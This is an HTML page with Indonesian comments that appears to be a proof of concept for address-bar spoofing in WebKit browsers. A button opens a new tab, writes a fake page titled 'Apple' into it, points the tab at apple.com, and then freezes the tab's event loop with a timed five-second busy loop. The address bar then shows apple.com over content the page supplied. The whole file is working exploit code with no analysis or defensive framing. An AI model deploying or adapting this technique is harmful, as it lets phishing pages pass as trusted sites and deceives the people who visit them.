<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, user-scalable=yes"
    />
    <title>Ultimate Force Lock - HALLO</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #000;
        color: #fff;
        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      }
      .container {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100%;
        gap: 16px;
        padding: 20px;
        box-sizing: border-box;
      }
      button {
        width: 100%;
        max-width: 400px;
        padding: 20px;
        font-size: 18px;
        font-weight: bold;
        background: #ff3b30;
        color: #fff;
        border: none;
        border-radius: 16px;
        cursor: pointer;
        box-shadow: 0 8px 24px rgba(255, 59, 48, 0.4);
      }
      button:active {
        transform: scale(0.96);
      }
    </style>
  </head>
  <body>
    <div class="container">
      <button id="startBtn">FORCE LOCK TO APPLE.COM</button>
    </div>

    <script>
      document.getElementById("startBtn").onclick = function () {
        this.style.display = 'none';

        // Membuka tab baru secara instan
        const newTab = window.open("", "_blank");

        if (newTab) {
          // Menyuntikkan halaman super simpel berisi teks "HALLO" sesuai permintaan
          newTab.document.write(`
            <!DOCTYPE html>
            <html>
            <head>
              <title>Apple</title>
              <meta name="viewport" content="width=device-width, initial-scale=1">
            </head>
            <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
              <h1 style="font-size:80px;font-weight:900;color:#000000;margin:0;">HALLO</h1>
            </body>
            </html>
          `);
          newTab.document.close();

          try { newTab.focus(); } catch (e) {}

          // TIMING KUNCI 1 (Sangat Cepat - 5ms): Memaksa location.href ditarik langsung ke apple.com
          setTimeout(() => {
            try {
              newTab.location.href = "https://apple.com";
            } catch (err) {}
          }, 5);

          // TIMING KUNCI 2 (25ms): Menembak dan membekukan render thread tepat saat UI memperbarui address bar
          setTimeout(() => {
            try {
              newTab.eval(`
                const start = Date.now();
                while (Date.now() - start < 5000) {
                  // Memaksa kalkulasi layout sinkronus berulang-ulang untuk mengunci event loop WebKit secara total
                  const forceReflow = document.body.offsetHeight;
                  document.body.style.backgroundColor = (forceReflow % 2 === 0) ? '#ffffff' : '#fcfcfc';
                }
              `);
            } catch (e) {
              // Fallback lokal jika context terisolasi ketat
              let s = Date.now(); while(Date.now() - s < 5000) {}
            }
          }, 25);
        }
      };
    </script>
  </body>
</html>
